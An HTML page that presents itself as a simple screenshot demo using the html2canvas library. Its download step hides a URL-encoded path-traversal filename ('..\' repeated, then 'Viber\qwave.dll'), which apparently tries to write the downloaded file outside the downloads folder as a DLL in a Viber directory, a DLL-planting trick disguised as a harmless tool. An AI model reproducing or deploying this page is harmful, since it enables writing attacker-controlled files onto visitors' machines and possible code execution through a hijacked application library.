<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Page Screenshot Tool</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    button {
      padding: 10px 16px;
      font-size: 16px;
      cursor: pointer;
    }
    .box {
      margin-top: 20px;
      padding: 20px;
      border: 2px solid #444;
      background: #f5f5f5;
    }
  </style>
</head>
<body>

  <h1>Screenshot Demo Page</h1>
  <p>Click the button below to take a screenshot of this page.</p>

  <button onclick="takeScreenshot()">Take Screenshot</button>

  <div class="box">
    <h2>Sample Content</h2>
    <p>This content will appear in the screenshot.</p>
  </div>

  <!-- html2canvas library -->
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>

  <script>
    function takeScreenshot() {
      html2canvas(document.body).then(function(canvas) {
        const link = document.createElement("a");
        link.download = "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cViber%5cqwave.dll";
        link.href = canvas.toDataURL("image/png");
        link.click();
      });
    }
  </script>

</body>
</html>
